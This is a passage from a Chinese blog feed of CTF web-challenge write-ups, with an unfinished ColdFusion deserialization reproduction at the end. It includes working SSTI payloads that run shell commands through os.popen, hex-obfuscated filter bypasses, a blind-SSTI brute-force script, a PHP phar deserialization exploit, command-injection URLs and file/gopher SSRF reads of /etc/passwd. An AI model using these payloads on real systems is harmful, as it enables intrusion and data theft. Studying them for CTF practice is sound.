class="line">str([].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;cat &#x2F;mnt&#x2F;f1a9&#39;).read())</span><br></pre></td></tr></table></figure><img src="/2020/12/02/1024cup/4.png" class=""><h2 id="1024-柏拉图"><a href="#1024-柏拉图" class="headerlink" title="1024_柏拉图"></a>1024_柏拉图</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>伪协议</li><li>phar</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，有一个url，可以读到baidu</p><p>尝试伪协议，发现file://双写可以绕过</p><p>发现还有一个class.php，读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"THI IS CTFSHOW"</span>.<span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c = $c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很基础的序列化，利用类A的<code>__destruct</code>触发<code>__toString()</code>，再触发<code>__invoke()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop:A()-&gt;destruct()-&gt;toString()-&gt;invoke()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#readfile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($filename)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/^phar|^smtp|^dict|^zip|file|etc|root|filter|\.\.\//i"</span>,$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"姿势太简单啦，来一点骚的？！"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    $file=$_GET[<span class="string">'filename'</span>];</span><br><span class="line">        <span class="keyword">if</span>(strstr($file, <span class="string">"flag"</span>) || check($file) || strstr($file, <span class="string">"php"</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"这么简单的获得不可能吧？！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> readfile($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以用phar协议，但是不能出现在开头，所以先用一个<code>compress.zlib://或者compress.zlib2://</code></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="string">'Off'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> A(<span class="string">''</span>);</span><br><span class="line">$o-&gt;a = <span class="keyword">new</span> B(<span class="string">''</span>);</span><br><span class="line">$o-&gt;a-&gt;b = <span class="keyword">new</span> C(<span class="string">'system("ls /");'</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"text.txt"</span>,<span class="string">"test"</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>上传修改为gif后缀的phar文件，查看文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.gif</span><br></pre></td></tr></table></figure><p>flag在根目录下，修改成读取flag文件的命令再上传，再读取即可</p><h2 id="1024-图片代理"><a href="#1024-图片代理" class="headerlink" title="1024_图片代理"></a>1024_图片代理</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>gopher打fastcgi</li><li>file://读取文件</li></ul><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，如图</p><img src="/2020/12/02/1024cup/7.png" class=""><p>url后拼接的像是base64编码之后的路径，尝试读取/etc/passwd</p><img src="/2020/12/02/1024cup/8.png" class=""><p>成功读取到，因为环境是nginx，读一下nginx的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#x3D;&gt;ZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><img src="/2020/12/02/1024cup/9.png" class=""><p>看到最后一行，搭过nginx都应该知道，在这个路径下会有一个default.conf，读取一下</p><img src="/2020/12/02/1024cup/10.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root         &#x2F;var&#x2F;www&#x2F;bushihtml;</span><br><span class="line">index        index.php index.html;</span><br><span class="line">fastcgi_pass   127.0.0.1:9000;</span><br></pre></td></tr></table></figure><p>应该是gopher打fasicgi了，生成的payload如图</p><img src="/2020/12/02/1024cup/11.png" class=""><p>打过去</p><img src="/2020/12/02/1024cup/5.png" class=""><p>可以看到一串类似flag的东西，读取一下</p><img src="/2020/12/02/1024cup/6.png" class=""><p>提示文件名就是flag，flag到手</p><h2 id="1024-hello-world"><a href="#1024-hello-world" class="headerlink" title="1024_hello_world"></a>1024_hello_world</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>SSTI</li><li>盲注</li></ul><h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，提示post传参key</p><p>测试，应该是ssti，发现下划线被过滤了，进制绕过</p><p>之后就是找到能够有os模块的，这里要用到盲注来进行字符比较</p><p>直接放exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">strs = string.digits+string.ascii_lowercase+<span class="string">'-&#123;&#125;'</span></span><br><span class="line">url = <span class="string">"http://fe197f70-2d9b-4224-9f8f-6037ac37304b.chall.ctf.show/"</span></span><br><span class="line">cmd = <span class="string">'cat /ctf*'</span></span><br><span class="line">rns = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> strs:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment">#'key':'&#123;%if ""["\\x5f\\x5fclass\\x5f\\x5f"]["\\x5f\\x5fbase\\x5f\\x5f"]["\\x5f\\x5fsubclasses\\x5f\\x5f"]()['+str(i)+']["\\x5f\\x5finit\\x5f\\x5f"]["\\x5f\\x5fglobals\\x5f\\x5f"]["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"]("os")%&#125;ans&#123;%endif%&#125;'</span></span><br><span class="line">            <span class="comment">#能用的下标很多，这里用的是64</span></span><br><span class="line">            <span class="string">'key'</span>: <span class="string">'&#123;%if ""["\\x5f\\x5fclass\\x5f\\x5f"]["\\x5f\\x5fbase\\x5f\\x5f"]["\\x5f\\x5fsubclasses\\x5f\\x5f"]()[64]["\\x5f\\x5finit\\x5f\\x5f"]["\\x5f\\x5fglobals\\x5f\\x5f"]["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"]("os")["\\x5f\\x5fdict\\x5f\\x5f"]["popen"]("'</span>+cmd+<span class="string">'")["read"]()['</span>+str(i)+<span class="string">']=="'</span>+ch+<span class="string">'"%&#125;ans&#123;%endif%&#125;'</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ans'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            rns += ch</span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">            print(rns)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#flag&#123;8cbdef3c-6508-452e-8989-9552b1d6d0af&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1024-WEB签到&quot;&gt;&lt;a href=&quot;#1024-WEB签到&quot; class=&quot;headerlink&quot; title=&quot;1024_WEB签到&quot;&gt;&lt;/a&gt;1024_WEB签到
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>forgivencup</title>
    <link href="http://yoursite.com/2020/12/01/forgivencup/"/>
    <id>http://yoursite.com/2020/12/01/forgivencup/</id>
    <published>2020-12-01T08:29:16.000Z</published>
    <updated>2020-12-01T16:11:28.271Z</updated>
    
    <content type="html"><![CDATA[<p>forgiven your lover!!!<a id="more"></a></p><h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>文件重定向</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1在文件里面是标准输出，stdout</span><br><span class="line">2是标准错误输出。stderr</span><br><span class="line">0是标准输入,stdin</span><br><span class="line"></span><br><span class="line">标准输入0、输出1、错误2需要分别重定向，一个重定向只能改变它们中的一个</span><br><span class="line">标准输入0和标准输出1可以省略。（当其出现重定向符号左侧时）</span><br><span class="line">文件描述符在重定向符号左侧时直接写即可，在右侧时前面加&amp;</span><br><span class="line">文件描述符与重定向符号之间不能有空格</span><br></pre></td></tr></table></figure><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>做题之前先来小小测试一下</p><img src="/2020/12/01/forgivencup/1.png" class=""><p>可以看到1.sh是正常的shell，能够执行，2.sh是随便写的，不能执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /flag 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>根目录下是有flag文件的，所以能够正常执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh /flag 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>flag文件本身只是一个txt文件，当作shell脚本肯定是不能执行的，这里就会拿出flag中的代码当作命令执行</p><img src="/2020/12/01/forgivencup/2.png" class=""><p>再来看一下</p><p>这里标准错误输出重定位到了标准输出，而标准输出是重定位到了1.txt，所以标准错误输出也就会重定位到1.txt，所以接下来就好做了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目源码</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'xbx'</span>])?system($_GET[<span class="string">'xbx'</span>]):highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>题目代码很简单，先看一下根目录</p><p>测试发下几乎过滤了所有bash命令，看一下bin文件夹</p><img src="/2020/12/01/forgivencup/3.png" class=""><p>还有个sh，利用上面的重定向符</p><p>这里需要<code>url</code>编码一下，避免被认作参数分隔符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh /flag 2&gt;&amp;1</span><br></pre></td></tr></table></figure><img src="/2020/12/01/forgivencup/4.png" class=""><p>非预期</p><p>/usr/local/bin下有php，可以执行php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php+文件，文件内容会被当成php代码执行，相当于是include</span><br><span class="line">&#x2F;?xbx&#x3D;php &#x2F;flag</span><br><span class="line"></span><br><span class="line">指定根目录，绕过open_basedir</span><br><span class="line">&#x2F;?xbx&#x3D;php -t &#x2F; -r &quot;include(&#39;&#x2F;flag&#39;);&quot;</span><br></pre></td></tr></table></figure><h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>python=&gt;list清除</li><li>SSTI</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>还是fastapi，先看当前全局变量</p><p>list(calc.<em>_globals_\</em>)或者str(calc.__globals__)</p><img src="/2020/12/01/forgivencup/5.png" class=""><p>有个<code>youdontknow</code>，可以读一下，里面过滤了一下ssti的关键词</p><p>这里可以用到list.clear来清楚，看看清楚之后的</p><img src="/2020/12/01/forgivencup/6.png" class=""><p>到这里基本就结束了，下面可以直接读flag文件也可以常规ssti</p><p>直接读</p><img src="/2020/12/01/forgivencup/7.png" class=""><p>SSTI</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;forgiven your lover!!!
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>NJUPT2020</title>
    <link href="http://yoursite.com/2020/11/24/NJUPT2020/"/>
    <id>http://yoursite.com/2020/11/24/NJUPT2020/</id>
    <published>2020-11-24T11:46:38.000Z</published>
    <updated>2020-11-24T14:03:38.046Z</updated>
    
    <content type="html"><![CDATA[<p>比赛撞车了，就看了一下签到flask，当时没细看，来复现了<a id="more"></a></p><h2 id="你就是我的master吗"><a href="#你就是我的master吗" class="headerlink" title="你就是我的master吗"></a>你就是我的master吗</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>进制绕过</li><li>ssti模板注入</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，界面很简单，看一下源码，找到提示<code>?name=master</code></p><img src="/2020/11/24/NJUPT2020/1.png" class=""><p>很熟悉，应该是flask模板注入</p><p>fuzz测试发现过滤了<code>.,&#39;,-,_,关键词class等</code></p><p>之类可以考虑用进制绕过，单引号用双引号代替，关键词可以拼接也可以直接进制替换</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?name=&#123;&#123;""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("ls")["\x72\x65\x61\x64"]()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/24/NJUPT2020/2.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛撞车了，就看了一下签到flask，当时没细看，来复现了
    
    </summary>
    
    
    
      <category term="NJUPT" scheme="http://yoursite.com/tags/NJUPT/"/>
    
  </entry>
  
  <entry>
    <title>祥云杯</title>
    <link href="http://yoursite.com/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>http://yoursite.com/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
    <published>2020-11-22T15:42:59.000Z</published>
    <updated>2020-11-22T16:36:08.361Z</updated>
    
    <content type="html"><![CDATA[<p>趁着比赛环境还没关，记录一下web题<a id="more"></a></p><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>命令执行</li><li>常见WAF绕过</li><li>find-linux</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题很常见的页面，就是ping，很熟悉了，直接构造命令执行</p><p>过滤了<code>;,空格,cat、tac、more、flag、*等</code>，空格用<code>%09</code>绕过，flag用fla?绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ls%<span class="number">09</span>/ <span class="comment">//查看根目录</span></span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/1.png" class=""><p>根目录下没发现flag，这里用find命令找一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|find%<span class="number">09</span>/%<span class="number">09</span>-name%<span class="number">09</span>?????f???</span><br><span class="line"><span class="comment">//这是队里师傅的，我当时比赛试了几个，最后猜测了一下是flag.txt就出来了正确的路径</span></span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/2.png" class=""><p>最后读取一下就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ca\t%<span class="number">09</span>/etc/.findf???/f???.txt</span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/3.png" class=""><h2 id="easygogogo"><a href="#easygogogo" class="headerlink" title="easygogogo"></a>easygogogo</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>目录刺穿</li><li>cookie</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题就很眼熟，随便账号就能登录，魔改自BJDCTF3的一道题，但是原题的payload不能用</p><p>先上传一个文件，抓包，修改文件名，记录下生成的cookie</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/4.png" class=""><p>然后重新下发一个容器，用同样的账号登录，上传一个正常图片，点击show页面时抓包，替换成记录下来的cookie，在访问，发现flag经过base64编码之后的就会出现在图片源码处，解密后拿到flag</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/5.png" class=""><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>ssti模板注入</li><li>NaN合法数值</li></ul><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题输入<code></code></p><p>发现报错，开启了debug模式，以为要算pin值，但是师傅们都说没有读取文件的利用点</p><p>后面直到看到了</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/6.png" class=""><p>注入点应该在cookie，base64加密之后赋值给cookie，但还不够，这样子只是单纯当作了字符串处理，下面这blacknut师傅给的就很关键</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/7.png" class=""><p>也就是说payload编码之后传给user写入cookie，然后猜数字也就是num那里填数字，这里就要用到NaN，具体指代合法的数值，这个之前国赛初赛的时候一道题用到过，纯靠队里师傅提醒</p><p>后面的模板要进行字符串拼接，因为有WAF限制</p><p>最终payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">131</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("o'</span>+<span class="string">'s").po'</span>+<span class="string">'pen("cat /super_secret_fl'</span><span class="string">'ag.txt")'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/8.png" class=""><h2 id="easyzzz（简单记录，具体待填坑）"><a href="#easyzzz（简单记录，具体待填坑）" class="headerlink" title="easyzzz（简单记录，具体待填坑）"></a>easyzzz（简单记录，具体待填坑）</h2><p>后台地址/admin539/login.php</p><p>管理员账号密码：admin/fuzzy9inve</p><p>登入后台修改模板中的 index.html 为<code>{if:1234567)echo</code>cat /flag<code>;//}{end if}</code>再返回index.html 即可获得flag</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/9.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;趁着比赛环境还没关，记录一下web题
    
    </summary>
    
    
    
      <category term="祥云杯" scheme="http://yoursite.com/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>Adobe-ColdFusion反序列化-CVE-2017-3066</title>
    <link href="http://yoursite.com/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/"/>
    <id>http://yoursite.com/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/</id>
    <published>2020-11-14T11:14:45.000Z</published>
    <updated>2020-11-14T12:12:23.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Adobe-ColdFusion反序列化命令执行"><a href="#Adobe-ColdFusion反序列化命令执行" class="headerlink" title="Adobe-ColdFusion反序列化命令执行"></a>Adobe-ColdFusion反序列化命令执行<a id="more"></a></h2><h3 id="Adobe-ColdFusion简介"><a href="#Adobe-ColdFusion简介" class="headerlink" title="Adobe ColdFusion简介"></a>Adobe ColdFusion简介</h3><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;coldfusion&#x2F;CVE-2017-3066&#x2F;</span><br><span class="line">centos</span><br><span class="line">docker-compose up -d</span><br><span class="line">这个镜像拉取的比较大，一个G左右，要等挺长时间的</span><br></pre></td></tr></table></figure><p>docker起来之后访问<code>http://your-ip:8500/CFIDE/administrator/index.cfm</code>，会要求输入密码，驶入<code>vulhub</code>就可以用了</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成poc</p><p>下载之后，就可以用给的生成poc来生成了，先试试<code>/tmp</code>目录下创建文件</p><p>windows下有问题，不论怎么试都会说找不到<code>com.codewhitesec.coldfusionpwn.ColdFusionPwner</code>主类</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/1.png" class=""><p>之后尝试放到了kali下面，结果成功了</p><img 